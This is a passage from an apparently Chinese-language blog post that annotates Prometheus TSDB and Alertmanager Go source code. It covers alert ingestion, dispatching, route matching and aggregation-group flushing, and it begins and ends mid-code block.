primary,</span><br><span class="line">secondaries: secondaries,</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地存储使用tsdb来存储：</p><p>prometheus中提供了接口，调用tsdb数据库来进行存储。tsdb后续单独来说明。</p><p>打开一个db库函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Open</span><span class="params">(path <span class="keyword">string</span>, l log.Logger, r prometheus.Registerer, opts *Options)</span> <span class="params">(*tsdb.DB, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> opts.MinBlockDuration &gt; opts.MaxBlockDuration &#123;</span><br><span class="line">opts.MaxBlockDuration = opts.MinBlockDuration</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Start with smallest block duration and create exponential buckets until the exceed the</span></span><br><span class="line"><span class="comment">// configured maximum block duration.</span></span><br><span class="line">rngs := tsdb.ExponentialBlockRanges(<span class="keyword">int64</span>(time.Duration(opts.MinBlockDuration).Seconds()*<span class="number">1000</span>), <span class="number">10</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> rngs &#123;</span><br><span class="line"><span class="keyword">if</span> v &gt; <span class="keyword">int64</span>(time.Duration(opts.MaxBlockDuration).Seconds()*<span class="number">1000</span>) &#123;</span><br><span class="line">rngs = rngs[:i]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">db, err := tsdb.Open(path, l, r, &amp;tsdb.Options&#123;</span><br><span class="line">WALFlushInterval:  <span class="number">10</span> * time.Second,</span><br><span class="line">RetentionDuration: <span class="keyword">uint64</span>(time.Duration(opts.Retention).Seconds() * <span class="number">1000</span>),</span><br><span class="line">BlockRanges:       rngs,</span><br><span class="line">NoLockfile:        opts.NoLockfile,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> db, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AlertManager"><a href="#AlertManager" class="headerlink" title="AlertManager"></a>AlertManager</h2><p>接收告警信息请求的地址为：<a href="http://localhost:9093/api/v1/alerts，api接收告警信息后会进入到api.addAlerts中。" target="_blank" rel="noopener">http://localhost:9093/api/v1/alerts，api接收告警信息后会进入到api.addAlerts中。</a></p><p>AlertManager服务启动时候，api.addAlerts方法会通过api.Register方法再路由中完成路由请求地址的注册。</p><p>在api.addAlerts方法中，会将从参数r中接受到的告警信息解析为types.Alert数组，最后将其插入本地缓存中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(api *API)</span> <span class="title">addAlerts</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> alerts []*types.Alert</span><br><span class="line"><span class="keyword">if</span> err := receive(r, &amp;alerts); err != <span class="literal">nil</span> &#123;</span><br><span class="line">respondError(w, apiError&#123;</span><br><span class="line">typ: errorBadData,</span><br><span class="line">err: err,</span><br><span class="line">&#125;, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">api.insertAlerts(w, r, alerts...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">receive</span><span class="params">(r *http.Request, v <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">dec := json.NewDecoder(r.Body)</span><br><span class="line"><span class="keyword">defer</span> r.Body.Close()</span><br><span class="line"></span><br><span class="line">err := dec.Decode(v)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Debugf(<span class="string">"Decoding request failed: %v"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警调度：</p><p>告警信息被插入AlertManager本地缓存后，会通过告警调度服务从本地缓存中获取告警信息，并将告警信息发送出去。</p><p>本地缓存基于内存实现，</p><p>告警调度服务的初始化代码在main中，reload方法完成，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">reload := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line">log.With(<span class="string">"file"</span>, *configFile).Infof(<span class="string">"Loading configuration file"</span>)</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.With(<span class="string">"file"</span>, *configFile).Errorf(<span class="string">"Loading configuration file failed: %s"</span>, err)</span><br><span class="line">configSuccess.Set(<span class="number">0</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">configSuccess.Set(<span class="number">1</span>)</span><br><span class="line">configSuccessTime.Set(<span class="keyword">float64</span>(time.Now().Unix()))</span><br><span class="line">configHash.Set(hash)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">conf, plainCfg, err := config.LoadFile(*configFile)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hash = md5HashAsMetricValue(plainCfg)</span><br><span class="line"></span><br><span class="line">err = apiv.Update(conf, time.Duration(conf.Global.ResolveTimeout))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmpl, err = template.FromGlobs(conf.Templates...)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">tmpl.ExternalURL = amURL</span><br><span class="line"></span><br><span class="line">inhibitor.Stop()</span><br><span class="line">disp.Stop()</span><br><span class="line"></span><br><span class="line">inhibitor = inhibit.NewInhibitor(alerts, conf.InhibitRules, marker)</span><br><span class="line">pipeline = notify.BuildPipeline(</span><br><span class="line">conf.Receivers,</span><br><span class="line">tmpl,</span><br><span class="line">waitFunc,</span><br><span class="line">inhibitor,</span><br><span class="line">silences,</span><br><span class="line">notificationLog,</span><br><span class="line">marker,</span><br><span class="line">)</span><br><span class="line">disp = dispatch.NewDispatcher(alerts, dispatch.NewRoute(conf.Route, <span class="literal">nil</span>), pipeline, marker, timeoutFunc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> disp.Run()</span><br><span class="line"><span class="keyword">go</span> inhibitor.Run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run方法具体实现如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Run starts dispatching alerts incoming via the updates channel.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Dispatcher)</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</span><br><span class="line">d.done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line">d.mtx.Lock()</span><br><span class="line">d.aggrGroups = <span class="keyword">map</span>[*Route]<span class="keyword">map</span>[model.Fingerprint]*aggrGroup&#123;&#125;</span><br><span class="line">d.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">d.ctx, d.cancel = context.WithCancel(context.Background())</span><br><span class="line"></span><br><span class="line">d.run(d.alerts.Subscribe())</span><br><span class="line"><span class="built_in">close</span>(d.done)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Subscribe方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Subscribe returns an iterator over active alerts that have not been</span></span><br><span class="line"><span class="comment">// resolved and successfully notified about.</span></span><br><span class="line"><span class="comment">// They are not guaranteed to be in chronological order.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Alerts)</span> <span class="title">Subscribe</span><span class="params">()</span> <span class="title">provider</span>.<span class="title">AlertIterator</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">ch   = <span class="built_in">make</span>(<span class="keyword">chan</span> *types.Alert, <span class="number">200</span>)</span><br><span class="line">done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">)</span><br><span class="line">alerts, err := a.getPending()</span><br><span class="line"></span><br><span class="line">a.mtx.Lock()</span><br><span class="line">i := a.next</span><br><span class="line">a.next++</span><br><span class="line">a.listeners[i] = ch</span><br><span class="line">a.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">a.mtx.Lock()</span><br><span class="line"><span class="built_in">delete</span>(a.listeners, i)</span><br><span class="line"><span class="built_in">close</span>(ch)</span><br><span class="line">a.mtx.Unlock()</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">//遍历告警列表</span></span><br><span class="line"><span class="keyword">for</span> _, a := <span class="keyword">range</span> alerts &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="comment">//将告警信息放入通道ch中</span></span><br><span class="line"><span class="keyword">case</span> ch &lt;- a:</span><br><span class="line"><span class="keyword">case</span> &lt;-done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;-done</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">//构建告警信息迭代器</span></span><br><span class="line"><span class="keyword">return</span> provider.NewAlertIterator(ch, done, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewAlertIterator returns a new AlertIterator based on the generic alertIterator type</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewAlertIterator</span><span class="params">(ch &lt;-<span class="keyword">chan</span> *types.Alert, done <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, err error)</span> <span class="title">AlertIterator</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;alertIterator&#123;</span><br><span class="line">ch:   ch,</span><br><span class="line">done: done,</span><br><span class="line">err:  err,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>run方法中，对告警信息的处理分为4步：获取告警信息，告警路由匹配，告警信息处理，清除告警信息为空的aggrGroup。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Dispatcher)</span> <span class="title">run</span><span class="params">(it provider.AlertIterator)</span></span> &#123;</span><br><span class="line">cleanup := time.NewTicker(<span class="number">30</span> * time.Second)</span><br><span class="line"><span class="keyword">defer</span> cleanup.Stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> it.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> alert, ok := &lt;-it.Next():</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="comment">// Iterator exhausted for some reason.</span></span><br><span class="line"><span class="keyword">if</span> err := it.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"Error on alert update: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">d.log.With(<span class="string">"alert"</span>, alert).Debug(<span class="string">"Received alert"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Log errors but keep trying.</span></span><br><span class="line"><span class="keyword">if</span> err := it.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"Error on alert update: %s"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//告警信息路由匹配</span></span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> d.route.Match(alert.Labels) &#123;</span><br><span class="line">d.processAlert(alert, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> &lt;-cleanup.C:</span><br><span class="line">d.mtx.Lock()</span><br><span class="line"><span class="comment">//每隔30s清除为空的告警组</span></span><br><span class="line"><span class="keyword">for</span> _, groups := <span class="keyword">range</span> d.aggrGroups &#123;</span><br><span class="line"><span class="keyword">for</span> _, ag := <span class="keyword">range</span> groups &#123;</span><br><span class="line"><span class="keyword">if</span> ag.empty() &#123;</span><br><span class="line">ag.stop()</span><br><span class="line"><span class="built_in">delete</span>(groups, ag.fingerprint())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">d.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> &lt;-d.ctx.Done():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>流程：</p><p><img src="/images/1572418287763.png" alt="1572418287763"></p><p>告警匹配：</p><p>AlertManager以路由匹配方式实现了告警分组，不同分组下的告警可以使用各不同的告警接受方式，告警组等待时间，告警组发送间隔，重复告警发送间隔。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Match does a depth-first left-to-right search through the route tree</span></span><br><span class="line"><span class="comment">// and returns the matching routing nodes.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Route)</span> <span class="title">Match</span><span class="params">(lset model.LabelSet)</span> []*<span class="title">Route</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !r.Matchers.Match(lset) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> all []*Route</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, cr := <span class="keyword">range</span> r.Routes &#123;</span><br><span class="line">matches := cr.Match(lset)</span><br><span class="line"></span><br><span class="line">all = <span class="built_in">append</span>(all, matches...)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> matches != <span class="literal">nil</span> &amp;&amp; !cr.Continue &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If no child nodes were matches, the current node itself is a match.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(all) == <span class="number">0</span> &#123;</span><br><span class="line">all = <span class="built_in">append</span>(all, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> all</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// processAlert determines in which aggregation group the alert falls</span></span><br><span class="line"><span class="comment">// and insert it.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Dispatcher)</span> <span class="title">processAlert</span><span class="params">(alert *types.Alert, route *Route)</span></span> &#123;</span><br><span class="line">group := model.LabelSet&#123;&#125;</span><br><span class="line"><span class="comment">//获取分组的维度和纬度值</span></span><br><span class="line"><span class="keyword">for</span> ln, lv := <span class="keyword">range</span> alert.Labels &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := route.RouteOpts.GroupBy[ln]; ok &#123;</span><br><span class="line">group[ln] = lv</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fp := group.Fingerprint()</span><br><span class="line"></span><br><span class="line">d.mtx.Lock()</span><br><span class="line">groups, ok := d.aggrGroups[route]</span><br><span class="line">    <span class="comment">//判断是否需要新建告警组</span></span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">groups = <span class="keyword">map</span>[model.Fingerprint]*aggrGroup&#123;&#125;</span><br><span class="line">d.aggrGroups[route] = groups</span><br><span class="line">&#125;</span><br><span class="line">d.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the group does not exist, create it.</span></span><br><span class="line">ag, ok := groups[fp]</span><br><span class="line">    <span class="comment">//判断是否新建路由组</span></span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">ag = newAggrGroup(d.ctx, group, route, d.timeout)</span><br><span class="line">groups[fp] = ag</span><br><span class="line"><span class="comment">//启动告警组</span></span><br><span class="line"><span class="keyword">go</span> ag.run(<span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">_, _, err := d.stage.Exec(ctx, alerts...)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"Notify for %d alerts failed: %s"</span>, <span class="built_in">len</span>(alerts), err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err == <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ag.insert(alert)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>run方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ag *aggrGroup)</span> <span class="title">run</span><span class="params">(nf notifyFunc)</span></span> &#123;</span><br><span class="line">ag.done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(ag.done)</span><br><span class="line"><span class="keyword">defer</span> ag.next.Stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> now := &lt;-ag.next.C:</span><br><span class="line"><span class="comment">// Give the notifcations time until the next flush to</span></span><br><span class="line"><span class="comment">// finish before terminating them.</span></span><br><span class="line">ctx, cancel := context.WithTimeout(ag.ctx, ag.timeout(ag.opts.GroupInterval))</span><br><span class="line"></span><br><span class="line"><span class="comment">// The now time we retrieve from the ticker is the only reliable</span></span><br><span class="line"><span class="comment">// point of time reference for the subsequent notification pipeline.</span></span><br><span class="line"><span class="comment">// Calculating the current time directly is prone to flaky behavior,</span></span><br><span class="line"><span class="comment">// which usually only becomes apparent in tests.</span></span><br><span class="line">            <span class="comment">//记录告警开始时间</span></span><br><span class="line">ctx = notify.WithNow(ctx, now)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Populate context with information needed along the pipeline.</span></span><br><span class="line">ctx = notify.WithGroupKey(ctx, ag.GroupKey())</span><br><span class="line">ctx = notify.WithGroupLabels(ctx, ag.labels)</span><br><span class="line">ctx = notify.WithReceiverName(ctx, ag.opts.Receiver)</span><br><span class="line">ctx = notify.WithRepeatInterval(ctx, ag.opts.RepeatInterval)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait the configured interval before calling flush again.</span></span><br><span class="line">ag.mtx.Lock()</span><br><span class="line">ag.next.Reset(ag.opts.GroupInterval)</span><br><span class="line">ag.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">ag.flush(<span class="function"><span class="keyword">func</span><span class="params">(alerts ...*types.Alert)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> nf(ctx, alerts...)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">cancel()</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> &lt;-ag.ctx.Done():</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flush方法中对告警信息进行两次复制，并分别将其缓存到alerts和alertsSlice中，告警信息通过传入的参数notify再次告警通知，之后再告警列表中删除过期的告警。</p><p>flush方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flush sends notifications for all new alerts.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ag *aggrGroup)</span> <span class="title">flush</span><span class="params">(notify <span class="keyword">func</span>(...*types.Alert)</span> <span class="title">bool</span>)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ag.empty() &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ag.mtx.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">alerts      = <span class="built_in">make</span>(<span class="keyword">map</span>[model.Fingerprint]*types.Alert, <span class="built_in">len</span>(ag.alerts))</span><br><span class="line">alertsSlice = <span class="built_in">make</span>([]*types.Alert, <span class="number">0</span>, <span class="built_in">len</span>(ag.alerts))</span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> fp, alert := <span class="keyword">range</span> ag.alerts &#123;</span><br><span class="line">alerts[fp] = alert</span><br><span class="line">alertsSlice = <span 